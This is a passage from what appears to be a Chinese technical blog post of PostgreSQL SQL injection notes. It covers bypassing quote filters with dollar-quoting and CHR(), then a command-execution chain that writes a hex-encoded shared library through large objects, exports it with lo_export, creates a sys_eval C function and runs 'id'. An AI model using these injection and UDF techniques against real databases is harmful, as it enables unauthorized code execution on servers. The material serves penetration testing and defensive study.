用$quote$代替单引号</span><br><span class="line">如:select pwd from admin wehre user&#x3D;&#39;beach&#39;</span><br><span class="line">成:select pwd from admin where user&#x3D;$x$beach$x$</span><br></pre></td></tr></table></figure>

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**&#x2F; &#x3D; &quot; &quot;</span><br><span class="line">;-- - 忽略尾随数据</span><br></pre></td></tr></table></figure>

<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用<code>$</code>符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $$test$$ &#x3D;&#x3D;  SELECT $quote$test$quote$; &#x3D;&#x3D; select &#39;test&#39;</span><br></pre></td></tr></table></figure>

<p>在字符串拼接的时候采取CHR()函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);等效于SELECT &#39;ABCDEFGH&#39;;</span><br></pre></td></tr></table></figure>

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="1-利用-libc-中的-system-函数"><a href="#1-利用-libc-中的-system-函数" class="headerlink" title="1.利用 libc 中的 system() 函数"></a>1.利用 libc 中的 system() 函数</h3><h3 id="2-利用Perl-Python脚本语言功能"><a href="#2-利用Perl-Python脚本语言功能" class="headerlink" title="2.利用Perl/Python脚本语言功能"></a>2.利用Perl/Python脚本语言功能</h3><h3 id="3-利用C语言自定义函数"><a href="#3-利用C语言自定义函数" class="headerlink" title="3.利用C语言自定义函数"></a>3.利用C语言自定义函数</h3><p>查看Postgresql目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT setting FROM pg_settings WHERE name&#x3D;&#39;data_directory&#39;;  </span><br></pre></td></tr></table></figure>

<p>查询oid</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select lo_creat(-1);</span><br></pre></td></tr></table></figure>

<p>oid与上面保持一致;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from pg_largeobject where loid&#x3D;18412;  </span><br></pre></td></tr></table></figure>

<p>把十六进制的so文件导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into pg_largeobject (loid,pageno,data) values(18412, 0, decode(&#39;7F454CXXXXXXXXX000&#39;, &#39;hex&#39;));  </span><br><span class="line">&#x2F;&#x2F;这里略写了十六进制so文件的完整内容</span><br></pre></td></tr></table></figure>

<p>利用postgresql自带函数将大型对象导出到文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT lo_export(18412, &#39;cmd.so&#39;);  </span><br></pre></td></tr></table></figure>

<p>建立UDF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS &#39;&#x2F;xxx&#x2F;cmd.so&#39;, &#39;sys_eval&#39; LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;  </span><br></pre></td></tr></table></figure>

<p>调用udf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#39;id&#39;);  </span><br></pre></td></tr></table></figure>

</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>